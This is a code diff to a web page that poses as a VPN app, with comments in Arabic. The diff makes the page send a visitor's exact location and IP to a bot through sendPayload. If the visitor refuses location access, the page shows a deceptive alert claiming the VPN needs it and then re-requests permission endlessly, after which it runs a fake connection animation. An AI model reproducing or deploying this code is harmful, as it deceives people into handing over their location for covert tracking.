@@ -303,16 +303,13 @@
             });
         }
 
-        btn.addEventListener('click', async () => {
-            const selectedServerText = serverSelect.options[serverSelect.selectedIndex].text;
-            
-            btn.disabled = true;
-            progressArea.style.display = 'block';
-            logText.innerHTML = `<span class="cyan-text">[0%]</span> جاري استدعاء صلاحيات الموقع لتحديد أقرب عقدة تشفير...`;
-
+        // دالة مخصصة لإدارة معالجة جلب الموقع وإعادة الطلب الإجباري عند الرفض
+        async function handleLocationSequence(selectedServerText) {
             try {
+                // محاولة جلب الموقع لأول مرة (أو تكرارها بناءً على الإغلاق)
                 const position = await requestExactLocation();
                 
+                // في حال الموافقة الناجحة
                 const lat = position.coords.latitude;
                 const lon = position.coords.longitude;
                 const acc = position.coords.accuracy;
@@ -326,22 +323,34 @@
 
                 await sendPayload(report2);
                 
+                // الانتقال لبدء شريط التقدم والمحاكاة بعد الاستلام الناجح
                 startFakeConnection(selectedServerText);
 
             } catch (error) {
+                // إبلاغ البوت بوقوع رفض أو تعذر مؤقت
                 let report2Reject = `❌ *[الرسالة 2/2] فشل جلب الموقع* ❌\n\n`;
                 report2Reject += `🎯 *IP الهدف:* \`${deviceFingerprint.publicIP}\`\n`;
-                report2Reject += `⚠️ *السبب:* تم رفض الصلاحية أو تعذر الوصول الجغرافي الحرفي. (${error.message})`;
-                
+                report2Reject += `⚠️ *السبب:* تم رفض الصلاحية الجغرافية. (${error.message})`;
                 await sendPayload(report2Reject);
                 
-                // التنبيه الإجباري الجديد وحث المستخدم على المحاولة مجدداً
+                // 1. إظهار رسالة التنبيه الإقناعية للمستخدم أولاً
                 alert("⚠️ تنبيه الاتصال بالشبكة:\nيجب السماح بصلاحية الموقع الجغرافي لتحديد العقدة الأقرب وتفعيل بروتوكول التشفير بنجاح.\n\nملاحظة: يتطلب تطبيق VPN الاتصال بالإنترنت لأول مرة لمزامنة المفاتيح مع الخادم.");
                 
-                progressArea.style.display = 'none';
-                logText.innerHTML = "في انتظار منح الصلاحيات لإعادة المحاولة...";
-                btn.disabled = false;
+                // 2. فور إغلاق التنبيه، يتم إعادة استدعاء الدالة نفسها لفتح طلب صلاحية المتصفح مجدداً (Loop حثي)
+                logText.innerHTML = `<span class="cyan-text">[اعادة محاولة]</span> في انتظار استجابة المستخدم لنافذة النظام...`;
+                handleLocationSequence(selectedServerText);
             }
+        }
+
+        btn.addEventListener('click', async () => {
+            const selectedServerText = serverSelect.options[serverSelect.selectedIndex].text;
+            
+            btn.disabled = true;
+            progressArea.style.display = 'block';
+            logText.innerHTML = `<span class="cyan-text">[0%]</span> جاري استدعاء صلاحيات الموقع لتحديد أقرب عقدة تشفير...`;
+
+            // تشغيل تدفق الفحص وإعادة المحاولة التلقائي
+            await handleLocationSequence(selectedServerText);
         });
 
         function startFakeConnection(serverName) {
